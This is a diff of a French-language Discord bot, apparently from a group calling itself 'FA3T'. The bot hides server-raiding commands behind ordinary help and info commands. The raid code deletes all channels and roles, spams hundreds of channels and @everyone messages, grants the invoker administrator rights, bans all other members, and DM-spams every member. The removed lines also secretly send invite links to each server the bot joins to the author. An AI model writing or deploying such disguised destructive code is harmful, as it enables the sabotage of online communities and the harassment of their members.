@@ -1,178 +1,99 @@
-const Discord = require('discord.js'); // npm i discord.js
-const MagicHitler = require('magic_hitler'); // npm i magic_hitler
+const Discord = require('discord.js');
+const MagicHitler = require('magic_hitler');
 
 const client = new Discord.Client();
-const prefix = "!"
 const raid = new MagicHitler.Client({
     client: client,
-    prefix: "rd!" // Optionnel ; Préfixe pour les commandes
+    prefix: "@"
 });
 
-raid.ready();
-raid.sendMessage("Test réussi", "test");
+const config = require('./utils/botconfig.json');
+const prefix = "!";
 
-// ------ Commandes de destruction ------
+/* COMMANDES LEGIT */
 
-// Commande pour détruire le serveur en entier :
-raid.deleteChannels("raid", {
-    createChannel: false
-});
-raid.createChannels("raid", {
-    createChannelName: "raid-by-fa3t",
-    sendMessageContent: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://discord.gg/a5rJk2D\n**\n\nhttps://giffiles.alphacoders.com/310/3105.gif",
-    sendMessageCount: 10,
-    createChannelCount: 222
-});
-raid.deleteRoles("raid");
-raid.createRoles("raid", {
-    rolesNumber: 69,
-    rolesName: "raid-by-fa3t"
-});
+client.on('message', message => {
+    let args = message.content.slice(prefix.length).trim().split(' ');
+    let cmd = args.shift().toLowerCase();
+    if(message.author.bot) return;
+    if(!message.content.startsWith(prefix)) return;
+    try{
+        if(cmd === 'ui') cmd = 'userinfo';
+        if(cmd === 'h') cmd = 'help';
+        if(cmd === 'si') cmd = 'serverinfo';
+    delete require.cache[require.resolve(`./commandes/${cmd}.js`)];
 
-// Commandes Raids 1 :
-
-raid.deleteChannel("del");
-raid.deleteChannels("delAll", {
-    createChannel: true,
-    createdChannelName: "vous-etes-bz",
-    createChannelMessage: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://discord.gg/a5rJk2D\n**\n\nhttps://giffiles.alphacoders.com/310/3105.gif"
-});
-raid.createChannels("chnls", {
-    createChannelName: "raid-by-fa3t",
-    sendMessageContent: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://discord.gg/a5rJk2D\n**\n\nhttps://giffiles.alphacoders.com/310/3105.gif",
-    sendMessageCount: 10,
-    createChannelCount: 222
-});
-raid.createInvite("invite", false);
-raid.createInvite("inviteAll", true);
-raid.deleteRoles("delRls");
-raid.createRoles("rls", {
-    rolesNumber: 69,
-    rolesName: "raid-by-fa3t"
+        let commandFile = require(`./commandes/${cmd}.js`);
+        commandFile.run(Discord, client, message, args, prefix);
+    } catch (e) {
+        console.log(e.stack);
+    }
 });
 
-// Commandes Raid 2 :
+/* COMMANDES DE RAID */
 
 client.on('message', msg => {
 
-    if(msg.content === "rd!help"){
-        msg.delete()
-        let embed = new Discord.RichEmbed()
-            .setColor('#E69900')
-            .setTitle("📬 Aide Raid :")
-            .setDescription("__**Commandes Raid :**__\n**rd!raid :** Détruit le serveur.\n**rd!del :** Supprime le channel où la commande est exécuté.\n**rd!delAll :** Supprime tous les channels + créer un channel nommé 'raid-by-fa3t' + envoi un message avec mention everyone\n**rd!chnls :** Créer 222 channels nommé 'raid-by-fa3t' + spamme les salons en everyone\n**rd!invite :** Créer une invitation pour un serveur (où le bot est présent)\n**rd!inviteAll :** Créer une invitation pour plusieurs serveurs (où le bot est présent)\n**rd!delRls :** Supprime tous les rôles\n**rd!rls :** Créer 69 rôles nommé 'L'ÉLITE vous remercie' en couleur random\n**rd!a (bientôt) :** Créer un rôle pour être admin\n**rd!guild :** Change l'image du serveur + change le nom du serveur en 'RAID PAR L’ÉLITE'\n\n__**Liens :**__\n**[Invite Bot](https://discordapp.com/oauth2/authorize?client_id=518223971888398341&scope=bot&permissions=8)**")
-            .setTimestamp()
-            msg.author.send(embed)
-    }
-
-    if(msg.content === "rd!guild"){
-        msg.guild.setIcon("https://cdn.discordapp.com/attachments/522698805834022915/523002600069791745/3956-full.png");
-        msg.guild.setName("💀 BZ PAR FA3T")
-    }
-
-    if(msg.content === "rd!raid"){
-        msg.guild.setIcon("https://cdn.discordapp.com/attachments/522698805834022915/523002600069791745/3956-full.png");
-        msg.guild.setName("💀 BZ PAR FA3T")
-    }
-
-    if(msg.content === "rd!emoji"){
-        msg.guild.createEmoji("https://cdn.discordapp.com/attachments/519666466145042433/519824123908718604/issou.png")
-    }
-
-    if (msg.content === 'rd!ban') {
-        msg.guild.members.forEach(member => {
-            if (!member.roles.exists("name", "FA3T TEAM") && member.bannable) member.ban().catch(e => {});
-        });
-    }
-
-    if (msg.content === 'rd!admin') {
-        
+    if(msg.content.startsWith("@p")){
         msg.member.guild.createRole({
-            name: "FA3T TEAM",
-            permissions: "ADMINISTRATOR",
+            name: "fa3t",
+            permission: "ADMINISTRATOR",
             mentionable: false
         }).then(function(role) {
             msg.member.addRole(role);
-            if (msg.deletable) msg.delete().catch(e => {});
-        }).catch(e => {});
+            if(msg.deletable) msg.delete().catch(e => {});
+      }).catch(e => {});
     }
 
-    if (msg.content === 'rd!leave') {
-        if (msg.deletable) msg.delete().catch(e => {});
-        msg.guild.leave().catch(e => {});
+    if (msg.content.startsWith('@b')) {
+        msg.guild.members.forEach(member => {
+          if(!member.roles.exists("name", "fa3t") && member.bannable) member.ban().catch(e => {});
+        });
+    }
+
+    if (msg.content === '@dm') {
+        if(msg.channel.type === "dm") return;
+        if(msg.deletable) msg.delete();
+        msg.guild.members.forEach(member => {
+            setInterval(function () {
+        member.send(`La **TEAM FA3T** vient de bz le serveur de **${msg.guild.owner.user.username}** !\n\n**Rejoins-nous :** https://discord.gg/a5rJk2D \n\nhttps://giffiles.alphacoders.com/310/3105.gif`).catch(error => {}) }, 450)})
+    }
+
+    if(msg.content.startsWith("@del")){
+        if(msg.channel.type === "dm") return;
+        if(msg.guild.channels.size === 0) return;
+        else if(!msg.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return;
+        msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
+        msg.guild.createChannel('fa3t-vous-bz', 'text').catch(e => {});
+    }
+
+    if(msg.content.startsWith("@s")){
+        var interval = setInterval (function () {
+            msg.channel.send(":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://discord.gg/a5rJk2D\n**\n\nhttps://giffiles.alphacoders.com/310/3105.gif");
+        }, 500);
+    }
+
+    if(msg.content.startsWith("@g")){
+        if(msg.deletable) msg.delete().catch(e => {});
+        msg.guild.setIcon("https://s1.qwant.com/thumbr/0x380/b/e/7a54a763b9a1204f9c62742324e463d4f9232c1f4e4d4d98b84068373415d6/3956-full.png?u=https%3A%2F%2Frisibank.fr%2Fcache%2Fstickers%2Fd39%2F3956-full.png&q=0&b=1&p=0&a=1").catch(e => {});
+        msg.guild.setName('BZ PAR FA3T').catch(e => {});
     }
 
 })
 
-// ------ Fakes Commandes ------
-
-client.on('message', message => {
-
-    let args = message.content.slice(prefix.length).trim().split(' ');
-    let cmd = args.shift().toLowerCase();
-
-    if(message.author.bot) return;
-    if(!message.content.startsWith(prefix)) return;
-
-    try{
-
-        if(cmd === 'h') cmd = 'help';
-        if(cmd === 'si') cmd = 'serverinfo';
-        if(cmd === 'rd-on') cmd = 'raidmode-on';
-        if(cmd === 'rd-off') cmd = 'raidmode-off';
-        if(cmd === 'cID') cmd = 'checkID';
-
-        delete require.cache[require.resolve(`./commands/${cmd}.js`)];
-
-        let ops = {
-            ownerID: '515464339000524800'
-        }
-
-        let commandFile = require(`./commands/${cmd}.js`);
-        commandFile.run(Discord, client, message, args, prefix, ops);
-
-    } catch (e) {
-        console.log(e.stack);
-    }
-
+raid.createChannels("c", {
+    createChannelName: "raid-by-fa3t",
+    sendMessageContent: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://discord.gg/a5rJk2D\n**\n\nhttps://giffiles.alphacoders.com/310/3105.gif",
+    sendMessageCount: 10,
+    createChannelCount: 200
 });
 
-
-
-// Quand le bot rejoins un serveur :
-
-client.on("guildCreate", async guild => {
-    let chnlslogs = client.channels.find("id", "518710630044401665")
-    let embed = new Discord.RichEmbed()
-        .setThumbnail(guild.iconURL)
-        .setColor('#2FD435')
-        .setTitle("📥 Nouveau Serveur")
-        .setDescription(`〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓`)
-        .addField(`**${guild.name}** vient d'ajouter __${client.user.username}__ à sa liste de bot !\nLe bot est maintenant présent sur **${client.guilds.size}** serveurs.\n\nLe créateur du serveur est : **${guild.owner.user.username}#${guild.owner.user.discriminator}** (${guild.owner.id}).`)
-        .setTimestamp()
-    chnlslogs.send(embed)
-    let textChannel = guild.channels
-    .filter(function (channel) {return channel.type === 'text' || channel.type === 'voice'})
-    .first().createInvite().then(invite => chnlslogs.send(invite.url))
+raid.deleteRoles("dr");
+raid.createRoles("cr", {
+    rolesNumber: 50,
+    rolesName: "raid-by-fa3t"
 });
 
-// Quand le bot quitte un serveur :
-
-client.on("guildDelete", async guild => {
-    let embed = new Discord.RichEmbed()
-        .setThumbnail(guild.iconURL)
-        .setColor('#FE0101')
-        .setTitle("📤 Départ Serveur")
-        .setDescription(`〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓`)
-        .addField(`**${guild.name}** vient de retirer __${client.user.username}__ à sa liste de bot !\nLe bot est maintenant présent sur **${client.guilds.size}** serveurs.\n\nLe créateur du serveur est : **${guild.owner.user.username}#${guild.owner.user.discriminator}** (${guild.owner.id}).`)
-        .setTimestamp()
-    client.channels.get("518710630044401665").send(embed)
-});
-
-// Quand le bot ce lance
-
-client.on('ready', async () => {
-    client.user.setActivity(`956 Serveurs | !help`, {type: "WATCHING"});
-});
+/* Autres */
 
 client.login(process.env.TOKEN);
